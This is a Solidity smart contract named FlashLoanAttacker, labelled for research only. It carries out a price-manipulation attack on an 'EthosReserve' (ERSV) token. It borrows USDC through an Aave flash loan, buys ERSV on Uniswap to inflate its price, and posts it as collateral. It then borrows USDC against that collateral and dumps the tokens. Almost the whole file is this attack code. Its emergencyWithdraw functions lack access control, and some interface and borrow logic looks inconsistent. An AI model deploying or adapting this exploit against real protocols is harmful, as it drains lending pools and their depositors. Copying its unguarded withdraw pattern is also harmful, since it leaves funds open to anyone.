// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "./EthosReserve.sol";

// Aave V2 interfaces
interface ILendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
    
    function supply(
        address asset,
        uint256 amount,
        address onBehalfOf,
        uint16 referralCode
    ) external;
    
    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;
}

// Uniswap V2 interfaces
interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

/**
 * @title Flash Loan Attacker
 * @dev Demonstrates price manipulation using flash loans
 * @notice FOR RESEARCH PURPOSES ONLY
 */
contract FlashLoanAttacker {
    using SafeERC20 for IERC20;
    
    // Token addresses (packed for gas optimization)
    address public immutable ethosReserve;
    address public immutable usdc;
    address public immutable weth;
    
    // DEX addresses (packed for gas optimization)
    address public immutable uniswapV2Factory;
    address public immutable uniswapV2Router;
    
    // Aave addresses (packed for gas optimization)
    address public immutable aaveLendingPool;
    address public immutable aaveDataProvider;
    
    // Attack state (packed for gas optimization)
    bool public attackInProgress;
    uint256 public attackProfit;
    
    constructor(
        address _ethosReserve,
        address _usdc,
        address _weth,
        address _uniswapV2Factory,
        address _uniswapV2Router,
        address _aaveLendingPool,
        address _aaveDataProvider
    ) {
        ethosReserve = _ethosReserve;
        usdc = _usdc;
        weth = _weth;
        uniswapV2Factory = _uniswapV2Factory;
        uniswapV2Router = _uniswapV2Router;
        aaveLendingPool = _aaveLendingPool;
        aaveDataProvider = _aaveDataProvider;
    }
    
    /**
     * @dev Execute flash loan attack
     * @param flashLoanAmount Amount to borrow via flash loan
     * @param manipulationAmount Amount to use for price manipulation
     */
    function executeAttack(uint256 flashLoanAmount, uint256 manipulationAmount) external {
        require(!attackInProgress, "Attack already in progress");
        attackInProgress = true;
        attackProfit = 0;
        
        // Step 1: Take flash loan from Aave (optimized array creation)
        address[] memory assets = new address[](1);
        assets[0] = usdc;
        
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashLoanAmount;
        
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0; // 0 = no debt, 1 = stable, 2 = variable
        
        bytes memory params = abi.encode(manipulationAmount);
        
        ILendingPool(aaveLendingPool).flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            params,
            0
        );
        
        attackInProgress = false;
    }
    
    /**
     * @dev Flash loan callback function (required by Aave)
     */
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == aaveLendingPool, "Caller must be lending pool");
        
        uint256 flashLoanAmount = amounts[0];
        uint256 manipulationAmount = abi.decode(params, (uint256));
        
        // Step 2: Manipulate price
        _manipulatePrice(manipulationAmount);
        
        // Step 3: Deposit collateral to Aave
        _depositCollateral();
        
        // Step 4: Borrow against inflated collateral
        _borrowAssets();
        
        // Step 5: Dump tokens to crash price
        _dumpTokens();
        
        // Step 6: Repay flash loan with premium
        uint256 amountToRepay = flashLoanAmount + premiums[0];
        uint256 allowance = IERC20(usdc).allowance(address(this), aaveLendingPool);
        if (allowance < amountToRepay) {
            IERC20(usdc).approve(aaveLendingPool, type(uint256).max);
        }
        
        return true;
    }
    
    /**
     * @dev Manipulate ERSV price using flash loan funds
     */
    function _manipulatePrice(uint256 amount) internal {
        // Buy ERSV with flash loan funds to pump price
        // Optimized path creation
        address[] memory path = new address[](2);
        path[0] = usdc;
        path[1] = ethosReserve;
        
        // Approve router to spend USDC (only if needed)
        uint256 allowance = IERC20(usdc).allowance(address(this), uniswapV2Router);
        if (allowance < amount) {
            IERC20(usdc).approve(uniswapV2Router, type(uint256).max);
        }
        
        // Swap USDC for ERSV to pump price
        IUniswapV2Router(uniswapV2Router).swapExactTokensForTokens(
            amount,
            0, // Accept any amount of ERSV
            path,
            address(this),
            block.timestamp + 300 // 5 minute deadline
        );
    }
    
    /**
     * @dev Deposit inflated ERSV as collateral
     */
    function _depositCollateral() internal {
        // Deposit ERSV to Aave as collateral
        uint256 collateralAmount = IERC20(ethosReserve).balanceOf(address(this));
        
        // Only approve if needed (gas optimization)
        uint256 allowance = IERC20(ethosReserve).allowance(address(this), aaveLendingPool);
        if (allowance < collateralAmount) {
            IERC20(ethosReserve).approve(aaveLendingPool, type(uint256).max);
        }
        
        // Supply ERSV as collateral
        ILendingPool(aaveLendingPool).supply(
            ethosReserve,
            collateralAmount,
            address(this),
            0
        );
    }
    
    /**
     * @dev Borrow stablecoins against inflated collateral
     */
    function _borrowAssets() internal {
        // Borrow USDC against the inflated ERSV collateral
        uint256 borrowAmount = calculateMaxBorrow();
        
        // Borrow USDC (variable rate)
        ILendingPool(aaveLendingPool).borrow(
            usdc,
            borrowAmount,
            2, // Variable rate
            0,
            address(this)
        );
        
        // Update attack profit
        attackProfit = borrowAmount;
    }
    
    /**
     * @dev Dump ERSV tokens to crash price
     */
    function _dumpTokens() internal {
        // Sell ERSV tokens to crash the price
        uint256 dumpAmount = IERC20(ethosReserve).balanceOf(address(this));
        
        if (dumpAmount > 0) {
            address[] memory path = new address[](2);
            path[0] = ethosReserve;
            path[1] = usdc;
            
            // Only approve if needed (gas optimization)
            uint256 allowance = IERC20(ethosReserve).allowance(address(this), uniswapV2Router);
            if (allowance < dumpAmount) {
                IERC20(ethosReserve).approve(uniswapV2Router, type(uint256).max);
            }
            
            // Swap ERSV for USDC to crash price
            IUniswapV2Router(uniswapV2Router).swapExactTokensForTokens(
                dumpAmount,
                0, // Accept any amount of USDC
                path,
                address(this),
                block.timestamp + 300 // 5 minute deadline
            );
        }
    }
    

    
    /**
     * @dev Calculate maximum borrow amount based on collateral
     */
    function calculateMaxBorrow() internal view returns (uint256) {
        // This would calculate based on Aave's LTV ratio
        // For demo purposes, we'll use a simple calculation
        uint256 collateralValue = IERC20(ethosReserve).balanceOf(address(this));
        
        // Assume LTV ratio of 50% (conservative estimate)
        // In reality, this would be fetched from Aave's data provider
        // Using bit shifting for gas optimization: 50% = 1/2
        return collateralValue >> 1; // Divide by 2 (50%)
    }
    
    /**
     * @dev Emergency function to withdraw stuck tokens
     */
    function emergencyWithdraw(address token) external {
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).safeTransfer(msg.sender, balance);
        }
    }
    
    /**
     * @dev Batch emergency withdraw for multiple tokens
     */
    function emergencyWithdrawBatch(address[] calldata tokens) external {
        uint256 length = tokens.length;
        for (uint256 i = 0; i < length;) {
            uint256 balance = IERC20(tokens[i]).balanceOf(address(this));
            if (balance > 0) {
                IERC20(tokens[i]).safeTransfer(msg.sender, balance);
            }
            unchecked { ++i; } // Gas optimization
        }
    }
    
    /**
     * @dev Get attack statistics
     */
    function getAttackStats() external view returns (bool, uint256) {
        return (attackInProgress, attackProfit);
    }
} 